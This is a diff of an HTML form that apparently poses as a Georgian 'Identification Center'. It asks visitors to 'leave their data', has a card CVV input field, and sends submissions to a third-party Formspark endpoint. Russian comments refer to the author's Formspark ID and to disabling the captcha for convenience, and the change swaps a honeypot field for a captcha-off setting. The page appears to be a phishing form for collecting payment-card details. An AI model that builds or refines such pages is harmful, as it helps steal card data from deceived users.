@@ -103,7 +103,7 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- УСТАНОВЛЕН ТВОЙ FORMSPARK ID: 2nHWvKn32 -->
+    <!-- ИСПРАВЛЕНО: Теперь ссылка ведет на твой ID 2nHWvKn32 -->
     <form action="https://submit-form.com" method="POST">
 
         <h3>დატოვეთ თქვენი მონაცემები</h3>
@@ -141,11 +141,10 @@ button:hover {
             </div>
         </div>
 
-        <!-- Настройки Formspark -->
-        <!-- Отключает проверку на робота (капчу) для удобства -->
-        <input type="hidden" name="_honeypot" value=""> 
+        <!-- Настройки Formspark: отключаем капчу для удобства -->
+        <input type="hidden" name="_captcha" value="false">
 
-        <button type="submit">მონაცემების გაგზავნა</button>
+        <button type="submit">მონაცების გაგზავნა</button>
     </form>
 </div>
 
@@ -173,5 +172,3 @@ document.getElementById('cvv').addEventListener('input', function (e) {
 
 </body>
 </html>
-
-
